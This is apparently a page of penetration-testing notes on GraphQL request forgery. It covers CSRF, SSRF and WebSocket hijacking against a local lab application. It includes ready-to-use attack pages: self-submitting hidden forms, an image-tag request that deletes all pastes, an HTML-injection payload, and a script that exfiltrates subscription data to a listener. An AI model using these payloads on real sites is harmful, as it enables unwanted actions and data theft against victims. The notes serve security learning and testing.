# REQUEST FORGERY AND HIJACKING

**Cross-Site Request Forgery (CSRF)**

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>The flow of a CSRF attack</p></figcaption></figure>

* CSRF attacks target clients by forcing them to perform unwanted actions.
* These actions are usually state-changing, such as updating a user's email or password, transferring money, or disabling security settings.
* CSRF takes advantage of the fact that browsers send necessary information, like session cookies, in every HTTP request to a site, and web servers cannot differentiate between legitimate and malicious requests.
* **HTML forms can use only GET and POST methods**.
* An attacker can use a crafted HTML form to make a request to a vulnerable application by tricking a user.
* CSRF attacks are limited to the actions a victim is allowed to perform.
* **GraphQL servers sometimes support operations over GET**, and they might intentionally reject GET-based mutations to allow read operations using GET only. If a target uses any GET-based queries to perform state changes, that is a vulnerability.
* To prevent CSRF, applications should implement **anti-CSRF tokens**, which are unique, unpredictable values included in requests that the server verifies.

#### **Locating State-Changing Actions**

* Mutation field names can be extracted using an introspection query.
* State-changing actions such as `createUser`, `importPaste`, `editPaste`, `uploadPaste`, `deletePaste`, and `createPaste` can be identified through introspection.
* Queries can also perform state-changing actions, for example, a `deleteAllPastes` query.

The introspection query shown in should return the mutation fields that exist in a schema

{% code overflow="wrap" %}
```graphql
# Introspection query to extract mutation field names
query {
    __schema {
        mutationType {
            fields {
                name
            }
        }
    }
}
--------------------------------
# Introspection query to extract query field names
query {
    __schema {
        queryType {
            fields {
                name
            }
        }
    }
}
```
{% endcode %}

#### **Testing for POST-Based Vulnerabilities**

* A crafted HTML form can be used to perform a POST-based CSRF attack.
* A hidden input tag ensures the form remains invisible to the victim.

{% code overflow="wrap" %}
```html
<html>
<h1>Click the button below to see the proof of concept!</h1>
    <body>
        <form id="auto_submit_form" method="POST" action="http://localhost:5013/graphql">
            <input type="hidden" name="query" value="mutation { createPaste(title:&quot;CSRF&quot;,content:&quot;content&quot;,public:true, burn: false) { paste { id content title burn }}}"/>
            <input type="submit" value="Submit">
        </form>
    </body>
<html>
------------------------------------
//  Automatic form submission with JavaScript
async function csrf() {
    for (let i = 0; i < 2; i++) {
    await sleep(i * 1000);
    }
    document.forms['auto_submit_for'].submit();
}
```
{% endcode %}



<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

#### **Testing for GET-Based Vulnerabilities**

* GET-based CSRF attacks involve sending a malicious link to a victim.
* GET requests with state-changing queries can be exploited via HTML injection.

{% code overflow="wrap" %}
```bash
curl -X GET "http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D"

{"errors":[{"message":"Can only perform a mutation operationfrom a POST request."}]}

<a href="http://localhost:5013/graphql?query=mutation{someSensitiveAction}"/>
<img src="http://localhost:5013/graphql?query=mutation{someSensitiveAction}"/>    
-----------------------
// To perform such a CSRF attack, this HTML file uses <form> tags to
// submit the query. JavaScript code defined using the <script> HTML tags
// makes the request automatically, as soon as the victim loads the page:

<html>
    <body>
        <h1>This form is going to submit itself in 2 seconds...</h1>
        <form id="auto_submit_form" method="GET" action="http://localhost:5013/graphql">
        <input type="hidden" name="query" value="query { deleteAllPastes }"/>
        <input type="submit" value="Submit">
    </form>
    </body>
    <script>
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async function csrf() {
        for (let i = 0; i < 2; i++) {
            await sleep(i * 1000);
        }
        document.forms['auto_submit_form'].submit();
    }
    csrf();
    </script>
<html>
------------
// GET-based CSRF using image tags
<html>
    <body>
        <h1>GET-based CSRF using an image tag</h1>
        <img src="http://localhost:5013/graphql?query={deleteAllPastes}" style="display: none;" />
    </body>
</html>
-------------------------
// Using HTML Injeciton
mutation {
    createPaste(content:"<img src=\"http://localhost:5013/graphql?query= {deleteAllPastes }\" </img>", title:"CSRF using image tags", public: true,burn: false) {
        paste {
            id
            content
        }
    }
}
```
{% endcode %}

#### Automating Testing with BatchQL and GraphQL Cop

```bash
python3 batch.py -e http://localhost:5013/graphql | grep -i "CSRF"
python3 graphql-cop.py -t http://localhost:5013/graphql | grep -i "CSRF"
```

The SameSite Flag



### **Server-Side Request Forgery (SSRF)**

* SSRF attacks target servers, aiming to obtain sensitive data, probe for internal services, make internal requests to restricted networks, or access cloud environment information.
* SSRF allows attackers to forge requests on behalf of servers.
* **An SSRF vulnerability can give an attacker access to services they otherwise wouldn't be able to reach directly**.
* This includes **cross-site port attacks (XSPA)**, where a server makes a request to an internal port that isn't directly accessible.
* Preventing SSRF involves sanitizing and validating user input in request fields and limiting the scope of request operations.

**Cross-Site WebSocket Hijacking (CSWSH)**

* CSWSH involves stealing another user's session via WebSocket connections.
* WebSocket handshakes can be hijacked if they lack anti-CSRF tokens, enabling attackers to forge messages using the victim's authenticated session.
* Attackers can exfiltrate GraphQL subscription responses via CSWSH.
* A WebSocket connection handshake is initiated over HTTP and may include cookies for authentication.
* Introspection can be used to identify subscription field names.
* To simulate a CSWSH attack, an attacker can set up a Netcat listener to receive exfiltrated data after a victim is tricked into loading malicious code.

```html
// Recon
query {
    __schema {
        subscriptionType {
            fields {
                name
            }
        }
    }
}
---------------------------------

// JavaScript code that performs WebSocket hijacking
<html>
    <h2>WebSockets Hijacking and GraphQL Subscription Response Exfiltration Demo</h2>
</html>
<script>
    const GQL = {
        CONNECTION_INIT: 'connection_init',
        CONNECTION_ACK: 'connection_ack',
        CONNECTION_ERROR: 'connection_error',
        CONNECTION_KEEP_ALIVE: 'ka',
        START: 'start',
        STOP: 'stop',
        CONNECTION_TERMINATE: 'connection_terminate',
        DATA: 'data',
        ERROR: 'error',
        COMPLETE: 'complete'
    }
    ws = new WebSocket('ws://localhost:5013/subscriptions');
    ws.onopen = function start(event) {
        var query = 'subscription getPaste {paste { id title content ipAddr userAgent public owner {name} } }';
        var graphqlMsg = {
            type: GQL.START,
            payload: {query}
        };
        ws.send(JSON.stringify(graphqlMsg));
    }
    ws.onmessage = function handleReply(event) {
        data = JSON.parse(event.data) 
        fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'}); 
    }
</script>
```

As mentioned in [**this talk**](https://www.youtube.com/watch?v=tIo_t5uUK50), check if it might be possible to connect to graphQL via WebSockets as that might allow you to bypass a potential WAF and make the websocket communication leak the schema of the graphQL:

```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
  var GQL_CALL = {
    extensions: {},
    query: `
        {
            __schema {
                _types {
                    name
                }
            }
        }`,
  }

  var graphqlMsg = {
    type: "GQL.START",
    id: "1",
    payload: GQL_CALL,
  }
  ws.send(JSON.stringify(graphqlMsg))
}
```
